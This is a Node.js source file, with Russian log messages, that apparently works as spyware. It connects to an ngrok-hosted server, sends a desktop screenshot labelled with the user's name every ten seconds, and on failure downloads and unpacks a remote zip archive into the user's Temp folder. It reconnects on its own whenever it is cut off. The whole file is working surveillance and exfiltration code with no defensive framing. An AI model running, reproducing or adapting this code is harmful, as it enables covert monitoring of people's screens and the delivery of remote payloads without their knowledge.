const address = 'https://rational-namely-chipmunk.ngrok-free.app';
const time = 10000;
const socket = require('socket.io-client')(address);
const screenshot = require('screenshot-desktop');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const extract = require('extract-zip');
const path = require('path')

const username = os.userInfo().username;
const HD = os.homedir();

let isImageProcessed = true;

async function connect() {
    try {
        const response = await axios.get(address)
        if (response.status === 200) upload(); console.log(response.status); 
        
    } catch (error) {
        console.log('Ошибка переподключение через 10 секунд...');
        setTimeout(connect, time);
    }
}

async function upload() {
    console.log("Uploading function");
    try {
        socket.on('connect', () => {
            console.log('Подключено к серверу');
            uploadImage();
            setInterval(() => {
                if (isImageProcessed) {
                    uploadImage();
                }
            }, time);
        });
    } catch (error) {
        console.log('Ошибка при подключении:');
        setTimeout(connect, time);
    }
}

async function uploadImage() {
    console.log("Uploading img function");
    try {
        const img = await screenshot();
        let base64Image = Buffer.from(img).toString('base64');
        let data = { image: base64Image };
        let headers = { "name": username };

        socket.emit('upload_image', data, headers);
        isImageProcessed = false;
        console.log("Sended");
        
    } catch (error) {
        console.log('Ошибка при создании скриншота:');
        let folderPath = path.join(HD, '\\AppData\\Local\\Temp\\screenCapture\\');
        let zipPath = path.join(folderPath, 'files.zip');
    
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
            console.log('Папка успешно создана!');
        }  
        let response = await axios.get(address, { headers: { 'getdata': 'true' }, responseType: 'arraybuffer' });
        fs.writeFileSync(zipPath, response.data);
        console.log('Файл успешно сохранен!'); 
        await extract(zipPath, { dir: folderPath });
        console.log('Файлы успешно извлечены!');
        connect();
    }
}    

connect();
socket.on('give-img', () => {
    console.log("SHA");
});

socket.on('disconnect', () => {
    console.log('Отключено от сервера');
    connect();
});

socket.on('image_processed', () => {
    isImageProcessed = true;
    console.log("image_processed");
});